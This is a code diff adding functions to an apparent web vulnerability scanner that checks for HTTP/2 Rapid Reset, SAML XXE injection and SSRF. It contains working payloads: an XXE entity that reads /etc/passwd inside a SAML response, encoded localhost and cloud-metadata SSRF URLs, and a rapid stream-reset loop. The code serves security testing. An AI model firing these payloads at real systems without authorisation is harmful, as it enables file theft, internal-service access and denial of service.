+                start = time.time()
+                cancelled = 0
+                for _ in range(100):
+                    try:
+                        with client.stream("GET", target) as resp:
+                            cancelled += 1
+                    except Exception:
+                        pass
+                elapsed = time.time() - start
+                # If server handles 100 rapid resets in <2s without error, it may be vulnerable
+                if cancelled >= 50 and elapsed < 3:
+                    findings.append({"type": "HTTP/2 Rapid Reset (CVE-2023-44487)",
+                                     "severity": "high", "url": target,
+                                     "detail": f"Server accepted {cancelled} rapid RST_STREAM in {elapsed:.1f}s — potential DoS",
+                                     "template": "apex-h2-rapid-reset"})
+        except Exception: continue
+    return findings
+
+
+def scan_saml_injection(crawl_data):
+    """SAML injection — XXE in SAML assertions, signature wrapping, replay."""
+    findings = []
+    tested = set()
+    saml_paths = ["/saml/login","/saml/sso","/saml/acs","/sso/saml",
+                  "/auth/saml","/api/saml","/saml2/login","/Shibboleth.sso/Login"]
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in saml_paths:
+            url = f"{base}{path}"
+            try:
+                r = _S.get(url, timeout=5)
+                if r.status_code not in (200,302,405): continue
+                # SAML endpoint found — test for XXE in SAMLResponse
+                import base64 as _b64
+                xxe_saml = _b64.b64encode(b"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    <saml:AttributeStatement>
+      <saml:Attribute Name="uid"><saml:AttributeValue>&xxe;</saml:AttributeValue></saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>""").decode()
+                r2 = _S.post(url, data={"SAMLResponse": xxe_saml}, timeout=5)
+                if "root:" in r2.text or "daemon:" in r2.text:
+                    findings.append({"type": "SAML XXE Injection",
+                                     "severity": "critical", "url": url,
+                                     "detail": "SAML endpoint vulnerable to XXE — reads /etc/passwd",
+                                     "template": "apex-saml"})
+                elif r2.status_code in (200,302):
+                    findings.append({"type": "SAML Endpoint Found",
+                                     "severity": "medium", "url": url,
+                                     "detail": "SAML SSO endpoint — test for signature wrapping manually",
+                                     "template": "apex-saml"})
+            except: continue
+    return findings
+
+
+def scan_dns_rebinding_ssrf(crawl_data):
+    """DNS rebinding SSRF — bypass IP allowlists via DNS TTL manipulation."""
+    findings = []
+    # We detect the vulnerability pattern (URL fetch + DNS resolution)
+    # rather than actually performing rebinding (requires infrastructure)
+    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
+                    "redirect","image","avatar","webhook","callback","endpoint","host")
+    for url, params in crawl_data.get("params",{}).items():
+        for p in params:
+            if p.lower() not in fetch_params: continue
+            try:
+                # Test with a domain that resolves to internal IP
+                # Using a known DNS rebinding test domain pattern
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                # Test 1: localhost variants
+                for payload in ["http://localhost/","http://0.0.0.0/","http://[::1]/",
+                                 "http://0177.0.0.1/","http://2130706433/",  # 127.0.0.1 in decimal
+                                 "http://0x7f000001/"]:  # 127.0.0.1 in hex
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
+                    try:
+                        r = _S.get(test_url, timeout=5)
+                        if any(x in r.text for x in ["root:","localhost","127.0.0.1","internal",
+                                                       "admin","dashboard","private"]):
+                            findings.append({"type": "DNS Rebinding / SSRF (Internal Access)",
+                                             "severity": "critical", "url": test_url,
+                                             "detail": f"Param '{p}' fetches internal resources via {payload}",
+                                             "template": "apex-dns-rebind"})
+                            break
+                    except: continue
+            except: continue
+    # Also check for URL fetch in forms
+    for form in crawl_data.get("forms",[]):
+        for inp in form.get("inputs",[]):
+            if inp.get("name","").lower() not in fetch_params: continue
+            action = form.get("action","")
+            if not action: continue
+            for payload in ["http://169.254.169.254/","http://0.0.0.0:22","http://[::1]:6379"]:
+                try:
+                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
+                    data[inp["name"]] = payload
+                    r = _S.post(action, data=data, timeout=5)
+                    if any(x in r.text for x in ["ami-id","ssh-","redis","root:"]):
+                        findings.append({"type": "DNS Rebinding SSRF via Form",
+                                         "severity": "critical", "url": action,
+                                         "detail": f"Form field '{inp['name']}' reaches internal services",
+                                         "template": "apex-dns-rebind"})
+                        break
+                except: continue
+    return findings
